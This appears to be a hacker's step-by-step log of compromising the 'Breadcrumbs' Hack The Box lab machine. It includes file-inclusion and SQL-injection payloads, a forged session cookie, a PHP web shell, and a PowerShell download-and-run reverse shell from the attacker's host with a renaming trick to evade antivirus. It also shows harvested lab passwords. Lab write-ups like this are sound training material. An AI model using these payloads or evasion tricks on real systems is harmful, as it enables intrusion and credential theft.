Machine-Name : Breadcrumbs
IP-Address   : 10.129.200.109

Command-Line: sudo nmap 10.129.200.109 -p- -A -T4
Result:
    ./nmap/init.txt

Command-Line: sudo nmap 10.129.200.109 -p- -A -T4 --script vuln
Result:
    ./nmap/vuln.txt

Browser: 10.129.200.109/
Notes: Has link to http://10.129.200.109/php/books.php which allows a search of "title" and "author"

~RECON~
Command-Line: ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -e php,txt -f -t 50 -i 200,301,302,403 -u http://10.129.200.109
Result:
    ./recon/recon1.txt

Browser: 10.129.200.109/portal
Notes: Signed up as username "uk47" and password "uk47" then signed into account. Clicked on "Check tasks".
Result:
    ./check_tasks.txt

Notes: Clicked on "User management".
Result:
    ./user_management.txt

Notes: Clicked on "File management" and nothing happened. Sent to BurpSuite and intercepted the response to the request.
Result:
    HTTP/1.1 302 Found
    Date: Mon, 16 Aug 2021 16:42:28 GMT
    Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
    X-Powered-By: PHP/8.0.1
    Expires: Thu, 19 Nov 1981 08:52:00 GMT
    Cache-Control: no-store, no-cache, must-revalidate
    Pragma: no-cache
    Location: ../index.php
    Content-Length: 3525
    Connection: close
    Content-Type: text/html; charset=UTF-8

Notes: Changing the response to a "200 OK".
Result: Access to "http://10.129.200.109/portal/php/files.php"
Screen-Shot: ./file_management_page.png

Notes: Signed out. Went to book page, selected a book, and then clicked "Yes". Caught the request in BurpSuite and sent to Repeater. Changed book3.html to book31.html.
Result:
    POST /includes/bookController.php HTTP/1.1
    Host: 10.129.200.109
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 25
    Origin: http://10.129.200.109
    DNT: 1
    Connection: close
    Referer: http://10.129.200.109/php/books.php
    Cookie: PHPSESSID=cp9883uqsbkifmrpcs14v260gv

    book=book31.html&method=1

    RESPONSE:
        file_get_contents(../books/book31.html): Failed to open stream: No such file or directory in <b>C:qqUsersqqwww-data\Desktop\xampp\htdocs\includes\bookController.php

Notes: Creating a custom script to print out file contents and option to list files and directories.
Result:
    ./lfi.py

Command-Line: python3 lfi.py ../db/db.php
Result:
    <?php
      $host="localhost";
      $port=3306;
      $user="bread";
      $password="jUli901";
      $dbname="bread";
      $con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());
    ?>

Command-Line: python3 lfi.py ../portal/includes/fileController.php
Result:
    /home/kali/HTB/Machines/Breadcrumbs_NF/lfi.py:12: DeprecationWarning: invalid escape sequence '\/'
      return bytes(resp.text, "utf-8").decode('unicode_escape').strip('"').replace('\/', '/')
    <?php
    $ret = "";
    require "../vendor/autoload.php";
    use \Firebase\JWT\JWT;
    session_start();

    function validate(){
        $ret = false;
        $jwt = $_COOKIE['token'];

        $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
        $ret = JWT::decode($jwt, $secret_key, array('HS256'));
        return $ret;
    }

    if($_SERVER['REQUEST_METHOD'] === "POST"){
        $admins = array("paul");
        $user = validate()->data->username;
        if(in_array($user, $admins) && $_SESSION['username'] == "paul"){
            error_reporting(E_ALL & ~E_NOTICE);
            $uploads_dir = '../uploads';
            $tmp_name = $_FILES["file"]["tmp_name"];
            $name = $_POST['task'];

            if(move_uploaded_file($tmp_name, "$uploads_dir/$name")){
                $ret = "Success. Have a great weekend!";
            }
            else{
                $ret = "Missing file or title :(" ;
            }
        }
        else{
            $ret = "Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.";
        }

        echo $ret;
    }

Notes: Using JWT token, found "secret_key" and "username" of admin is 'paul'.Uploads are sent to "../portal/uploads".

Notes: Going through BurpSuite traffic and trying different URL paths.
Command-Line: python3 lfi.py ../portal/login.php a
Result:
    require 'db/db.php';
    require "cookie.php";
    require "vendor/autoload.php";
    use \Firebase\JWT\JWT;

Notes: Found the cookie generator.
Command-Line: python3 lfi.py ../portal/cookie.php
Result:
    <?php
    /**
     * @param string $username  Username requesting session cookie
     *
     * @return string $session_cookie Returns the generated cookie
     *
     * @devteam
     * Please DO NOT use default PHPSESSID; our security team says they are predictable.
     * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
     * */
    function makesession($username){
        $max = strlen($username) - 1;
        $seed = rand(0, $max);
        $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
        $session_cookie = $username.md5($key);

        return $session_cookie;
    }

Notes: Found the function to make session. Copying code to ./cookie.php on local Kali machine.
Result:
    ./cookie.php

Notes: Within cookie.php, the seed was removed and hard-coded to "paul".
Command-Line: php cookie.php
Result:
    paula2a6a014d3bee04d7df8d5837d62e8c5
    paul61ff9d4aaefe6bdf45681678ba89ff9d
    paul8c8808867b53c49777fe5559164708c3
    paul47200b180ccd6835d25d034eeb6e6390

Notes: Used BurpSuite to replace the PHPSESSID with one of the above keys. "paul47200b180ccd6835d25d034eeb6e6390" returned a "200 OK" and was placed into the PHPSESSID for Paul to login.
Result:
    Username: Paul
    Role: Admin

Notes: Need to change the JWT token.
URL: https://jwt.io/
Secret: 6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e
Notes: Changed username to 'paul' jwt.io.
JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.CTCOKEiZeswsO1cFQqNHuoiMUVvvVtVr4ocYOtJYnEg
Notes: Uploaded "test.php". Changed file from .zip to .php. Tested http://10.129.200.109/portal/uploads/cmd.php?cmd=whoami
Result:
    breadcrumbs/www-data

Browser: PowerShell Reverse Shell
URL: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell
Code: powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.139/shellme.ps1')

Command-Line: cp ~/HackingTools/nishang/Shells/Invoke-PowerShellTcp.ps1 .
Command-Line: mv Invoke-PowerShellTcp.ps1 shellme.ps1
Command-Line(./www): sudo python3 -m http.server --bind 10.10.14.139 80
Command-Line: nc -lvnp 9001

Browser: http://10.129.200.109/portal/uploads/cmd.php?cmd=powershell%20IEX%20(New-Object%20Net.WebClient).DownloadString(%27http://10.10.14.139/shellme.ps1%27)
Result:
    No shell returned.

!!!TRY HARDER!!!

Notes: Replaced all "Invoke-PowerShellTcp" in file ./www/shellme.ps1 with "uk47" to bypass Windows Defender AV.
Result:
    ./www/shellme.ps1

Browser: http://10.129.200.109/portal/uploads/cmd.php?cmd=powershell%20IEX%20(New-Object%20Net.WebClient).DownloadString(%27http://10.10.14.139/shellme.ps1%27)
Result:
    *** REVERSE SHELL ***
    PS C:\Users\www-data\Desktop\xampp\htdocs\portal\uploads>

PS C:\Users\www-data\Desktop\xampp\htdocs\portal\uploads> whoami
Result:
    breadcrumbs\www-data

PS C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData> dir
Result:

    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -a----        11/28/2020   1:48 AM            170 alex.disabled
    -a----        11/28/2020   1:48 AM            170 emma.disabled
    -a----        11/28/2020   1:48 AM            170 jack.disabled
    -a----        11/28/2020   1:48 AM            170 john.disabled
    -a----         1/17/2021   3:11 PM            192 juliette.json
    -a----        11/28/2020   1:48 AM            170 lucas.disabled
    -a----        11/28/2020   1:48 AM            170 olivia.disabled
    -a----        11/28/2020   1:48 AM            170 paul.disabled
    -a----        11/28/2020   1:48 AM            170 sirine.disabled
    -a----        11/28/2020   1:48 AM            170 william.disabled

Notes: Date on "juliette.json" is different from all the rest. It is also labeled as a .json file.

PS C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData> type juliette.json
Result:
    {
            "pizza" : "margherita",
            "size" : "large",
            "drink" : "water",
            "card" : "VISA",
            "PIN" : "9890",
            "alternate" : {
                    "username" : "juliette",
                    "password" : "jUli901./())!",
            }
    }

Command-Line: ssh juliette@10.129.200.109
Password: jUli901./())!
Result:
    *** USER ACCESS ***
    juliette@BREADCRUMBS C:\Users\juliette>

juliette@BREADCRUMBS C:\Users\juliette> type Desktop/user.txt
Result:
    4c1ee240dedbc74128378bd2a41e760f
    *** USER OWNED ***

juliette@BREADCRUMBS C:\Users\juliette\Desktop>type todo.html
Result:
    <table>
            <tr>
                <th>Task</th>
                <th>Status</th>
                <th>Reason</th>
            </tr>
            <tr>
                <td>Configure firewall for port 22 and 445</td>
                <td>Not started</td>
                <td>Unauthorized access might be possible</td>
            </tr>
            <tr>
                <td>Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager<
    /td>
                <td>In progress</td>
                <td>It stores passwords in plain text</td>
            </tr>
            <tr>
                <td>Add new features to password manager</td>
                <td>Not started</td>
                <td>To get promoted, hopefully lol</td>
            </tr>
    </table>

Browser: Backup Microsoft Store Sticky Notes
URL:https://www.windowscentral.com/how-backup-sticky-notes-windows-10
Code: %LocalAppData%\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState

PS C:\Users\juliette\appdata\local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState> dir
Result:
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -a----         1/15/2021   4:10 PM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
    -a----        11/29/2020   3:10 AM           4096 plum.sqlite
    -a----         1/15/2021   4:10 PM          32768 plum.sqlite-shm
    -a----         1/15/2021   4:10 PM         329632 plum.sqlite-wal

Notes: Downloading * files in directory. Inspecting with sqlite3.
Command-Line: scp juliette@10.129.200.109:/Users/juliette/appdata/local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/* .
Result:
    ./sqlite/
        15cbbc93e90a4d56bf8d9a29305b8981.storage.session
        plum.sqlite
        plum.sqlite-shm
        plum.sqlite-wal

kali@kali:~/HTB/Machines/Breadcrumbs_NF/sqlite$ sqlite3 plum.sqlite
sqlite>.dump
Result:
    INSERT INTO Note VALUES(replace('\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!\n\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g\n\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]','\n',char(10)),'ManagedPosition=',1,0,NULL,'Yellow',0,NULL,NULL,NULL,NULL,NULL,NULL,'0c32c3d8-7c60-48ae-939e-798df198cfe7','8e814e57-9d28-4288-961c-31c806338c5b',637423162765765332,NULL,637423163995607122);

Notes: Found credentials for username "development".
Results:
    id      : fc0d8d70-055d-4870-a5de-d76943a68ea2
    username: development
    password: fN3)sN5Ee@g

Command-Line: ssh development@10.129.200.109
Password: fN3)sN5Ee@g
Result:
    *** SHELL SUCCESSFUL ***
    *** DEVELOPMENT ACCESS ***
    development@BREADCRUMBS C:\Users\development>

PS C:\Users\development> net user development
Result:
    User name                    development
    Full Name
    Comment
    User's comment
    Country/region code          000 (System Default)
    Account active               Yes
    Account expires              Never

    Password last set            1/17/2021 2:41:09 AM
    Password expires             Never
    Password changeable          1/17/2021 2:41:09 AM
    Password required            Yes
    User may change password     Yes

    Workstations allowed         All
    Logon script
    User profile
    Home directory
    Last logon                   8/17/2021 3:46:29 PM

    Logon hours allowed          All

    Local Group Memberships      *Users
    Global Group memberships     *None
    The command completed successfully.

kali@kali:~/HTB/Machines/Breadcrumbs_NF/development$ scp development@10.129.200.109:/Development/* .
Result:
    ./development/Krypter_Linux

Command-Line: file Krypter_Linux
Result:
    Krypter_Linux: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ab1fa8d6929805501e1793c8b4ddec5c127c6a12, for GNU/Linux 3.2.0, not stripped

Notes: Inspecting Krypter_Linux with Ghidra.
Result:
    if (local_1c == 0x641) {
      if (local_28 != 0) {
        puts("Requesting decryption key from cloud...\nAccount: Administrator");
        curl_easy_setopt(local_28,0x2712,"http://passmanager.htb:1234/index.php");
        curl_easy_setopt(local_28,0x271f,"method=select&username=administrator&table=passwords");
        curl_easy_setopt(local_28,0x4e2b,WriteCallback);
        curl_easy_setopt(local_28,0x2711,local_58);
        local_2c = curl_easy_perform(local_28);
        curl_easy_cleanup(local_28);
        puts("Server response:\n\n");
        this = std::operator<<((basic_ostream *)std::cout,local_58);
        std::basic_ostream<char,std::char_traits<char>>::operator<<
                  ((basic_ostream<char,std::char_traits<char>> *)this,
                   std::endl<char,std::char_traits<char>>);

Notes: "0x641" to_decimal == 1601. In ascii this can be represented as "ddddddddddddddd23". The function appears to make a request to "http://passmanager.htb:1234/index.php" with data d=select&username=administrator&table=passwords".

Notes: Port 1234 is not available directly. Abusing SSH to tunnel into the program.
Command-Line: sudo nano /etc/hosts
File-Contents:
    127.0.0.1  passmanager.htb
Command-Line: ssh -L 1234:127.0.0.1:1234 juliette@10.129.200.109
Result:
    *** SUCCESSFUL SSH TUNNELING ***

Command-Line: curl http://127.0.0.1:1234 -d "method=select&username=administrator&table=passwords"
Result:
    selectarray(1) {
      [0]=>
      array(1) {
        ["aes_key"]=>
        string(16) "k19D193j.<19391("
      }
    }

Notes: Found "aes_key" => "k19D193j.<19391("

Command-Line: curl http://127.0.0.1:1234 -d "method=select&username=administrator'&table=passwords"
Result:
    select<br />
    <b>Fatal error</b>:  Uncaught TypeError: mysqli_fetch_all(): Argument #1 ($result) must be of type mysqli_result, bool given in C:\Users\Administrator\Desktop\passwordManager\htdocs\index.php:18
    Stack trace:
    #0 C:\Users\Administrator\Desktop\passwordManager\htdocs\index.php(18): mysqli_fetch_all(false, 1)
    #1 {main}
      thrown in <b>C:\Users\Administrator\Desktop\passwordManager\htdocs\index.php</b> on line <b>18</b><br />

Notes: Data input seems to be vulnerable to MYSQL-injection.

Command-Line: curl http://127.0.0.1:1234 -d "method=select&username=administrator'union select schema_name from information_schema.schemata -- -&table=passwords"
Result:
    selectarray(3) {
      [0]=>
      array(1) {
        ["aes_key"]=>
        string(16) "k19D193j.<19391("
      }
      [1]=>
      array(1) {
        ["aes_key"]=>
        string(18) "information_schema"
      }
      [2]=>
      array(1) {
        ["aes_key"]=>
        string(5) "bread"
      }
    }


Command-Line: curl http://127.0.0.1:1234 -d "method=select&username=administrator' union select table_name from information_schema.tables where table_schema = 'bread' -- -&table=passwords"
Result:
    selectarray(2) {
      [0]=>
      array(1) {
        ["aes_key"]=>
        string(16) "k19D193j.<19391("
      }
      [1]=>
      array(1) {
        ["aes_key"]=>
        string(9) "passwords"
      }
    }


Command-Line: curl http://127.0.0.1:1234 -d "method=select&username=administrator' union select concat(table_name,':',column_name) from information_schema.columns where table_schema = 'bread' -- -&table=passwords"
Result:
    selectarray(5) {
      [0]=>
      array(1) {
        ["aes_key"]=>
        string(16) "k19D193j.<19391("
      }
      [1]=>
      array(1) {
        ["aes_key"]=>
        string(12) "passwords:id"
      }
      [2]=>
      array(1) {
        ["aes_key"]=>
        string(17) "passwords:account"
      }
      [3]=>
      array(1) {
        ["aes_key"]=>
        string(18) "passwords:password"
      }
      [4]=>
      array(1) {
        ["aes_key"]=>
        string(17) "passwords:aes_key"
      }
    }


Command-Line: curl http://127.0.0.1:1234 -d "method=select&username=administrator' union select concat(account,':',password,':',aes_key) from bread.passwords -- -&table=passwords"
Result:
    selectarray(2) {
      [0]=>
      array(1) {
        ["aes_key"]=>
        string(16) "k19D193j.<19391("
      }
      [1]=>
      array(1) {
        ["aes_key"]=>
        string(75) "Administrator:H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=:k19D193j.<19391("
      }
    }

Notes: Retrieved account-type, password, and aes_key.
Browser: CyberChef
CyberChef Settings:
    From base64
    AES DECODE
    ----------
    Key(UTF-8) = k19D193j.<19391(
    IV(16 bytes HEX) = 0000000000000000000000000000000
    MODE: CBC
    INPUT: RAW
    OUTPUT: RAW
Result:
    p@ssw0rd!@#$9890./

Command-Line: ssh administrator@10.129.200.109
Result:
    *** ROOT ACCESS ***
    administrator@BREADCRUMBS C:\Users\Administrator>

administrator@BREADCRUMBS C:\Users\Administrator>cd Desktop
Result:
    administrator@BREADCRUMBS C:\Users\Administrator\Desktop>

administrator@BREADCRUMBS C:\Users\Administrator\Desktop>type root.txt
Result: c2b81b9b99cb3b87ed4c1735dd76bb17
    *** ROOT OWNED ***

      *** FINISHED ***
